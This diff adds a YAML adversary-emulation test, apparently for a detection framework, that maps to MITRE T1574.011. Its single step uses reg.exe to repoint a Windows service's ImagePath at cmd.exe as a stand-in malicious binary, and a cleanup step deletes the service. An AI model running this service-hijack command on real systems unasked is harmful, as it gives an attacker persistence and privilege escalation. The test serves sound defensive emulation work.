@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Service ImagePath Change with reg.exe
+description: |
+    Change Service registry ImagePath of a bengin service to a malicious file
+args:
+    - name: malicious_service_path
+      type: string
+      default: '%windir%\system32\cmd.exe'
+    - name: weak_service_name
+      type: string
+      default: calcservice
+    - name: weak_service_path
+      type: string
+      default: '%windir%\system32\win32calc.exe'
+uuid: f38e9eea-e1d7-4ba6-b716-584791963827
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1574: Hijack Execution Flow'
+    subtechniques:
+        - 'T1574.011: Services Registry Permissions Weakness'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: service-imagepath-change-with-reg.exe
+      inline: |
+        reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\{{.Args.weak_service_name}}" /f /v ImagePath /d "{{.Args.malicious_service_path}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            sc.exe delete {{.Args.weak_service_name}}
+        executor: command_prompt
